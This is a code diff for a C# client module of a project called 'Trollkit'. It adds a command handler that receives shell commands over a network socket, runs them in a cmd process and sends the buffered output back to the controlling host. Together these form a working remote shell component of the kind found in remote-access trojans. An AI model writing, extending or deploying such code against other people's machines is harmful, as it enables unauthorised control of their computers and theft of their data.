@@ -9,6 +9,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using Trollkit_Library;
 using Trollkit_Library.Models;
+using Trollkit_Library.Modules;
 
 namespace Trollkit_Client.Modules.CommandHandlers
 {
@@ -17,23 +18,29 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		Process p;
 		private StreamWriter Writer { get { return p.StandardInput; } }
 
+		private List<string> CMDLineBuffer;
+
+		public CMDHandler()
+		{
+			CMDLineBuffer = new List<string>();
+		}
+
+
 		public override bool HandleCommand(Socket s, TransferCommandObject obj)
 		{
 			switch (obj.Command)
 			{
 				case "ExecuteCMD":
-					GetCommandResponse(obj.Value);
-					return true;
-
+					return ExecuteCommand(s, obj.Value);
 				case "StopCMD":
 					StopProcess();
-					break;
+					return true;
 			}
 			return false;
 		}
 
 
-		private void StartOrCreateProcess()
+		private void StartOrCreateProcess(Socket s)
 		{
 			if(p == null)
 			{
@@ -47,7 +54,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 				p.StartInfo = startInfo;
 				p.Start();
 				p.OutputDataReceived += P_OutputDataReceived;
-				p.BeginOutputReadLine();
+				p.BeginOutputReadLine();			
 			}
 
 			if (p.HasExited)
@@ -68,14 +75,46 @@ namespace Trollkit_Client.Modules.CommandHandlers
 
 		private void P_OutputDataReceived(object sender, DataReceivedEventArgs e)
 		{
-			BConsole.WriteLine(e.Data, ConsoleColor.Cyan);
+			CMDLineBuffer.Add(e.Data);
 		}
 
-		private string GetCommandResponse(string command)
+		private void ReadBuffer(Socket s)
 		{
-			StartOrCreateProcess();
-			Writer.WriteLine(command);			
-			return "End Of Command";
+			Thread.Sleep(300);
+			if (CMDLineBuffer.Count != 0)
+			{
+				string appendedLines = "";
+
+				foreach (string line in CMDLineBuffer)
+					appendedLines += line + "\r\n";
+				CMDLineBuffer.Clear();
+
+				//write buffer to host
+				TransferCommandObject responseCMDTransferObject = new TransferCommandObject { Command = "CMDResponse", Value = appendedLines };
+				SendResponseObjectToSocket(s, ClientServerPipeline.BufferSerialize(responseCMDTransferObject));
+				ReadBuffer(s);
+			}
+		}
+
+
+		private bool ExecuteCommand(Socket s, string command)
+		{
+			try
+			{
+				StartOrCreateProcess(s);
+				Writer.WriteLine(command);
+
+				Task.Run(() => {
+					ReadBuffer(s);
+				});
+
+				return true;
+			}
+			catch (Exception e)
+			{
+				BConsole.WriteLine("CMD Error: " + e.Message, ConsoleColor.Red);
+				return false;
+			}
 		}
 	}
 }
